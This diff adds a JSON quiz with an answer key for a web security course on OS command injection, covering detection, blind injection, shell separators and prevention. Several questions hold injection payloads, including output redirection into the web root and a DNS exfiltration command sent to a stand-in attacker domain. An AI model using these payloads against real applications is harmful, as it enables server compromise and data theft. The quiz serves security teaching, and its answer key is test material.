@@ -1,0 +1,232 @@
+{
+  "title": "OS Command Injection",
+  "course": "WEBSEC",
+  "questions": [
+    {
+      "type": "text",
+      "category": "Fundamentals",
+      "q": "What is the other common name for OS command injection?",
+      "answer": ["shell injection", "shell injection."],
+      "explain": "OS command injection is also known as shell injection."
+    },
+    {
+      "type": "tf",
+      "category": "Fundamentals",
+      "q": "A successful OS command injection attack typically lets an attacker fully compromise the application and its data, and can be leveraged to pivot to other systems in the organization.",
+      "answer": true,
+      "explain": "It allows execution of OS commands on the server, often fully compromising the app and its data and enabling pivots to other systems by exploiting trust relationships."
+    },
+    {
+      "type": "mc",
+      "category": "Injecting OS commands",
+      "q": "In the stock-checking example, the app calls out to a shell command with user-supplied product and store IDs. Which input, submitted in the productID parameter, executes an arbitrary command?",
+      "choices": [
+        "& echo aiwefwlguh &",
+        "productID=echo",
+        "<script>echo</script>",
+        "' OR '1'='1"
+      ],
+      "answer": 0,
+      "explain": "The & is a shell command separator, so the input runs an injected echo command between the original command and its arguments."
+    },
+    {
+      "type": "mc",
+      "category": "Injecting OS commands",
+      "q": "Why is the echo command useful when testing for OS command injection?",
+      "choices": [
+        "It causes a supplied string to be echoed in the output, confirming the command ran",
+        "It opens a reverse shell to the attacker",
+        "It escapes any shell metacharacters in the input",
+        "It deletes the original command's arguments"
+      ],
+      "answer": 0,
+      "explain": "echo causes the supplied string to appear in the output, a useful way to test for some types of OS command injection."
+    },
+    {
+      "type": "mc",
+      "category": "Injecting OS commands",
+      "q": "Why is it useful to place an additional command separator (such as &) AFTER the injected command?",
+      "choices": [
+        "It separates the injected command from whatever follows the injection point, reducing the chance that the following text prevents the injected command from executing",
+        "It encrypts the injected command so filters cannot detect it",
+        "It forces the server to return the command output in the HTTP response",
+        "It is required syntax or the shell throws a fatal error"
+      ],
+      "answer": 0,
+      "explain": "The trailing separator isolates the injected command from the rest of the original command line, so trailing arguments don't break the injection."
+    },
+    {
+      "type": "mc",
+      "category": "Useful commands",
+      "q": "Which command returns the name of the current user on BOTH Linux and Windows?",
+      "choices": ["whoami", "uname -a", "ver", "ps -ef"],
+      "answer": 0,
+      "explain": "whoami works on both platforms. uname -a / ver report the OS, and ps -ef lists processes on Linux."
+    },
+    {
+      "type": "mc",
+      "category": "Useful commands",
+      "q": "Which pair correctly gives the 'operating system' command for Linux then Windows?",
+      "choices": [
+        "uname -a / ver",
+        "ver / uname -a",
+        "whoami / whoami",
+        "ifconfig / ipconfig /all"
+      ],
+      "answer": 0,
+      "explain": "On Linux use uname -a; on Windows use ver."
+    },
+    {
+      "type": "mc",
+      "category": "Useful commands",
+      "q": "Which command shows the network configuration on Windows?",
+      "choices": ["ipconfig /all", "ifconfig", "netstat -an", "tasklist"],
+      "answer": 0,
+      "explain": "Windows uses ipconfig /all; the Linux equivalent is ifconfig."
+    },
+    {
+      "type": "mc",
+      "category": "Useful commands",
+      "q": "To list running processes, which commands are used on Linux and Windows respectively?",
+      "choices": [
+        "ps -ef / tasklist",
+        "tasklist / ps -ef",
+        "netstat -an / netstat -an",
+        "uname -a / ver"
+      ],
+      "answer": 0,
+      "explain": "Linux: ps -ef. Windows: tasklist."
+    },
+    {
+      "type": "tf",
+      "category": "Blind command injection",
+      "q": "In a blind OS command injection vulnerability, the application returns the output of the injected command within its HTTP response.",
+      "answer": false,
+      "explain": "Blind means the application does NOT return the command output in its response, so the echo payload won't work and other techniques are required."
+    },
+    {
+      "type": "mc",
+      "category": "Blind command injection",
+      "q": "Which command is recommended for detecting blind OS command injection via a time delay, because it lets you control how long the command runs?",
+      "choices": ["ping", "echo", "nslookup", "whoami"],
+      "answer": 0,
+      "explain": "ping lets you specify the number of ICMP packets (e.g. ping -c 10 127.0.0.1), controlling the response time so you can confirm execution from the delay."
+    },
+    {
+      "type": "num",
+      "category": "Blind command injection",
+      "q": "The payload '& ping -c 10 127.0.0.1 &' causes the application to ping its loopback adapter for approximately how many seconds?",
+      "answer": 10,
+      "tolerance": 0,
+      "explain": "ping -c 10 sends 10 ICMP packets, causing about a 10-second delay to the loopback adapter."
+    },
+    {
+      "type": "mc",
+      "category": "Blind command injection",
+      "q": "How can you exploit blind OS command injection by redirecting output so you can read it in a browser?",
+      "choices": [
+        "Send the output into a file within the web root (e.g. & whoami > /var/www/static/whoami.txt &), then fetch that file over HTTP",
+        "Pipe the output into the ping command",
+        "echo the output directly in the HTTP response",
+        "Email the output to the site administrator"
+      ],
+      "answer": 0,
+      "explain": "The > character redirects command output to a file under the web root, which you then retrieve with the browser."
+    },
+    {
+      "type": "text",
+      "category": "Blind command injection",
+      "q": "Which command would you inject to trigger an out-of-band (OAST) DNS lookup to a domain you control, confirming the injection?",
+      "answer": ["nslookup", "nslookup."],
+      "explain": "e.g. & nslookup kgji2ohoyw.web-attacker.com & causes a DNS lookup the attacker can monitor to confirm the command ran."
+    },
+    {
+      "type": "mc",
+      "category": "Blind command injection",
+      "q": "What does the out-of-band payload '& nslookup `whoami`.kgji2ohoyw.web-attacker.com &' achieve?",
+      "choices": [
+        "It exfiltrates the whoami result by placing it in the DNS lookup to the attacker's domain",
+        "It opens an interactive shell on the attacker's domain",
+        "It redirects the whoami output into a file in the web root",
+        "It triggers a 10-second time delay"
+      ],
+      "answer": 0,
+      "explain": "The backticks run whoami inline and its result becomes part of the looked-up domain (e.g. wwwuser.kgji2ohoyw.web-attacker.com), exfiltrating the output over DNS."
+    },
+    {
+      "type": "multi",
+      "category": "Shell metacharacters",
+      "q": "Which of these command separators work on BOTH Windows and Unix-based systems?",
+      "choices": ["&", "&&", "|", "||", ";", "newline (\\n)"],
+      "answer": [0, 1, 2, 3],
+      "explain": "&, &&, | and || work on both. The semicolon and newline (0x0a) work only on Unix-based systems."
+    },
+    {
+      "type": "multi",
+      "category": "Shell metacharacters",
+      "q": "Which command separators work ONLY on Unix-based systems (not Windows)?",
+      "choices": ["; (semicolon)", "newline (0x0a / \\n)", "&", "||"],
+      "answer": [0, 1],
+      "explain": "The semicolon and a newline character work only on Unix-based systems; & and || work on both."
+    },
+    {
+      "type": "mc",
+      "category": "Shell metacharacters",
+      "q": "On Unix-based systems, which syntax lets you perform inline execution of an injected command within the original command?",
+      "choices": [
+        "Backticks `cmd` or $(cmd)",
+        "{cmd} or [cmd]",
+        "#cmd or //cmd",
+        "<cmd> or </cmd>"
+      ],
+      "answer": 0,
+      "explain": "Backticks and $(...) perform inline execution of an injected command on Unix-based systems."
+    },
+    {
+      "type": "mc",
+      "category": "Shell metacharacters",
+      "q": "If your controlled input appears within quotation marks in the original command, what must you do before injecting a new command?",
+      "choices": [
+        "Terminate the quoted context first using \" or '",
+        "URL-encode the entire payload",
+        "Convert the input to a number",
+        "Add a null byte at the end"
+      ],
+      "answer": 0,
+      "explain": "You must close the quoted context (with \" or ') before using shell metacharacters to inject a new command."
+    },
+    {
+      "type": "mc",
+      "category": "Prevention",
+      "q": "What is described as the most effective way to prevent OS command injection vulnerabilities?",
+      "choices": [
+        "Never call out to OS commands from application-layer code; use safer platform APIs instead",
+        "Escape all shell metacharacters in user input",
+        "Run the application as a non-root user",
+        "Only allow requests over HTTPS"
+      ],
+      "answer": 0,
+      "explain": "The most effective defense is to avoid calling OS commands from application code and use safer platform APIs; in almost all cases the functionality can be implemented another way."
+    },
+    {
+      "type": "multi",
+      "category": "Prevention",
+      "q": "If you must call OS commands with user input, which of the following are given as examples of effective input validation?",
+      "choices": [
+        "Validating against a whitelist of permitted values",
+        "Validating that the input is a number",
+        "Validating that the input contains only alphanumeric characters, with no other syntax or whitespace",
+        "Escaping shell metacharacters in the input"
+      ],
+      "answer": [0, 1, 2],
+      "explain": "Whitelisting, requiring a number, and allowing only alphanumeric characters are all recommended. Escaping metacharacters is explicitly discouraged as error-prone and bypassable."
+    },
+    {
+      "type": "tf",
+      "category": "Prevention",
+      "q": "Sanitizing input by escaping shell metacharacters is the recommended defense against OS command injection.",
+      "answer": false,
+      "explain": "You should never rely on escaping shell metacharacters; in practice it is too error-prone and vulnerable to bypass by a skilled attacker."
+    }
+  ]
+}
